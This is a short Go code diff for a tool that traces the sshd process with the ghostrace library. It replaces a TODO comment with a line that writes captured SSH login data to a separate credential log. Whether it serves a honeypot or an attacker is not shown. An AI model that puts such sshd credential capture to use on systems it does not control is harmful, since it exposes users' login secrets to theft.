@@ -3,12 +3,13 @@ package main
 import (
 	"encoding/binary"
 	"log"
+	"strings"
 
 	"./ghostrace/ghost"
 	"./ghostrace/ghost/sys/call"
 )
 
-func trace(sshd int, logger *log.Logger) error {
+func trace(sshd int, logger *log.Logger, credLog *log.Logger) error {
 	tracer := ghost.NewTracer()
 	trace, err := tracer.Trace(sshd)
 	if err != nil {
@@ -33,7 +34,7 @@ func trace(sshd int, logger *log.Logger) error {
 					}
 					proc := getProc(parent.Pid(), logger)
 					proc.Shell = true
-					// TODO: credlogger.log(login)
+					credLog.Printf("%#v\n", strings.Join(login, ", "))
 					proc.LogLogin(login)
 				}
 			}
